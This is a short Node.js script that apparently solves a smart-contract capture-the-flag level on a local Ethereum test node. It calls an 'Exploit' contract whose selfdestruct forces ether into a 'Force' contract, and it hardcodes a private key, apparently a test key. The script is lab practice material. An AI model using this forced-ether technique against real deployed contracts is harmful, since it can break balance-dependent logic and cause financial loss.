// @format

const Web3 = require('web3');
const Tx = require('ethereumjs-tx');
const BigNumber = require('bignumber.js');

const force = require('./build/contracts/Force.json');
const exploit = require('./build/contracts/Exploit.json');

(async function pwn() {
  // Note that we're not using the deployment keys of the truffle here.
  var privateKey =
    'a3ade3bffea3a3af6c4fdcb7305a3f26a2baff5b97e2f061fadebb9215b6460b';
  var publicKey = '0x03e2edce4bb10110c3b75d14737100c0c34f7199';

  const provider = new Web3.providers.HttpProvider('http://localhost:8545');
  const web3 = new Web3(provider);
  const networkId = await web3.eth.net.getId();
  const forceAddress = force.networks[networkId].address;
  const exploitAddress = exploit.networks[networkId].address;
  const exploitContract = new web3.eth.Contract(exploit.abi, exploitAddress);

  let balance = await web3.eth.getBalance(forceAddress);
  console.log('Balance of contract:', balance);

  // Call a method that calls selfdestruct on contract.
  await exploitContract.methods
    .pwn()
    .send({from: publicKey, value: web3.utils.toWei('1', 'ether')});

  balance = await web3.eth.getBalance(forceAddress);
  console.log('Balance of contract:', balance);
})();
